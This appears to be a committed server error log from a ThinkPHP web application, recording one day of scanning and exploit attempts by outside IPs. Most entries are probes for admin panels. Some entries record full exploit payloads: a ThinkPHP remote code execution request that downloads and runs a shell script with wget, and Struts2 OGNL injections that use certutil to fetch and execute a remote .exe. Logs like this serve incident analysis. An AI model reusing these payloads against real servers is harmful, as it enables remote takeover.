@@ -1,0 +1,69 @@
+[ 2018-12-28T05:49:18+08:00 ] 77.222.113.252 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-12-28T05:49:19+08:00 ] 77.222.113.252 /phpMyAdmin/
+ERR: 无法加载控制器:PhpMyAdmin
+
+[ 2018-12-28T05:49:21+08:00 ] 77.222.113.252 /pma/
+ERR: 无法加载控制器:Pma
+
+[ 2018-12-28T05:49:22+08:00 ] 77.222.113.252 /myadmin/
+ERR: 无法加载控制器:Myadmin
+
+[ 2018-12-28T05:49:24+08:00 ] 77.222.113.252 /sql/
+ERR: 无法加载控制器:Sql
+
+[ 2018-12-28T05:49:25+08:00 ] 77.222.113.252 /mysqladmin/
+ERR: 无法加载控制器:Mysqladmin
+
+[ 2018-12-28T10:13:20+08:00 ] 47.75.147.204 /wls-wsat/CoordinatorPortType
+ERR: 无法加载控制器:Wls-wsat
+
+[ 2018-12-28T10:16:36+08:00 ] 198.12.97.71 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://198.12.97.71/Haxed.sh;%20chmod%20+x%20Haxed.sh;%20sh%20Haxed.sh;rm%20-rf%20Haxed.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-28T10:57:11+08:00 ] 87.120.36.240 /ws_utc/resources/setting/options/general
+ERR: 无法加载控制器:Ws_utc
+
+[ 2018-12-28T10:57:20+08:00 ] 87.120.36.240 /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.141.104/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action
+ERR: 无法加载控制器:${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http:
+
+[ 2018-12-28T10:57:21+08:00 ] 87.120.36.240 /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.141.104/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action
+ERR: 无法加载控制器:${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http:
+
+[ 2018-12-28T10:57:25+08:00 ] 87.120.36.240 /invoker/readonly
+ERR: 无法加载控制器:Invoker
+
+[ 2018-12-28T10:57:26+08:00 ] 87.120.36.240 /invoker/JMXInvokerServlet
+ERR: 无法加载控制器:Invoker
+
+[ 2018-12-28T10:57:28+08:00 ] 87.120.36.240 /jmx-console/HtmlAdaptor
+ERR: 无法加载控制器:Jmx-console
+
+[ 2018-12-28T10:57:30+08:00 ] 87.120.36.240 /orders.xhtml
+ERR: 无法加载控制器:Orders.xhtml
+
+[ 2018-12-28T10:57:35+08:00 ] 87.120.36.240 /users
+ERR: 无法加载控制器:Users
+
+[ 2018-12-28T10:57:36+08:00 ] 87.120.36.240 /dbi_put1.jsp/
+ERR: 无法加载控制器:Dbi_put1.jsp
+
+[ 2018-12-28T10:57:36+08:00 ] 87.120.36.240 /dbi_put1.jsp
+ERR: 无法加载控制器:Dbi_put1.jsp
+
+[ 2018-12-28T10:57:37+08:00 ] 87.120.36.240 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-12-28T10:57:38+08:00 ] 87.120.36.240 /wls-wsat/CoordinatorPortType
+ERR: 无法加载控制器:Wls-wsat
+
+[ 2018-12-28T15:58:56+08:00 ] 58.251.121.184 /users
+ERR: 无法加载控制器:Users
+
+[ 2018-12-28T16:29:29+08:00 ] 14.17.3.65 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-12-28T21:01:16+08:00 ] 194.147.32.109 //recordings/
+ERR: 无法加载控制器:Recordings
+
